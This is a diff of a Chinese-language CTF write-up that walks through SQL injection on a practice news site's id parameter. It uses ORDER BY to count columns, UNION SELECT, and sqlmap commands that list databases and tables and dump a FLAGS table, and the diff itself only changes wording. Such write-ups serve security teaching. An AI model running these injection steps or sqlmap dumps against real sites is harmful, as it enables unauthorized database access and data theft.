@@ -23,7 +23,7 @@ https://news.macacahub.tw/
 
 乍看之下是個普通的公告欄，隨意點進其中一則可以發現網址列帶 id 參數，題目已經提示是 SQL injection，因此可以直接從網址的 id 參數下手作為注入點。其中，這種查詢資料庫類型的 SQL injection，我們可以搭配 `UNION SELECT` 針對可顯示資訊的頁面進行查詢。
 
-第一步，起手式用 `ORDER BY` 來推測表格欄位的數目。
+第一步，起手式用 `ORDER BY` 來推測查詢表格欄位的數目。
 
 ```http
 https://news.macacahub.tw/new.php?id=1 ORDER BY 3       # success
@@ -36,7 +36,7 @@ https://news.macacahub.tw/new.php?id=1 ORDER BY 4       # fail
 
 > 注意，通常網址送出去都會被轉換成 URL encode（ e.g. (空格) = '%20' ）
 
-經過測試可以知道 id 的資料型態為整數，且測到 `ORDER BY 4` 網頁就沒有顯示顯示畫面，判斷表格的欄位數為 3，如此一來我們就可以用 `UNION SELECT` 串接其他 SQL 的查詢語句。
+經過測試可以知道 id 的資料型態為整數，且測到 `ORDER BY 4` 網頁就沒有顯示畫面，表示查詢表格的欄位數為 3，如此一來我們就可以用 `UNION SELECT` 串接其他 SQL 的查詢語句（注意 `UNION SELECT` 後面接的查詢欄位數目必須和前句相同）。
 
 再來，我們嘗試戳 id，先找到一個無法正常查詢到的頁面（ e.g. id=6 ），拿來當作我們進行 SQL injection 要顯示結果的畫面，配合剛剛摸索到的欄位數，先來塞個 1, 2, 3 看看會怎麼樣。
 
@@ -103,25 +103,25 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 當然可以用純手工的方式慢慢戳，但利用 `sqlmap` 工具更快進行上述這般的 SQL injection 拿 Flag，流程上大致相同。
 
-> Find Database name
+🙉 Find Database name
 ```bash
 $ sqlmap -u https://news.macacahub.tw/new.php\?id\=1 --dbs
 ```
 ![ ](./pic/1-1.png)
 
-> Find Table name
+🙉 Find Table name
 ```bash
 $ sqlmap -u https://news.macacahub.tw/new.php\?id\=1 -D newsdb --tables
 ```
 ![ ](./pic/1-2.png)
 
-> Find column type
+🙉 Find column type
 ```bash
 $ sqlmap -u https://news.macacahub.tw/new.php\?id\=1 -D newsdb -T FLAGS --columns
 ```
 ![ ](./pic/1-3.png)
 
-> Dump FLAGS
+🙉 Dump FLAGS
 ```bash
 $ sqlmap -u https://news.macacahub.tw/new.php\?id\=1 -D newsdb -T FLAGS --dump
 ```
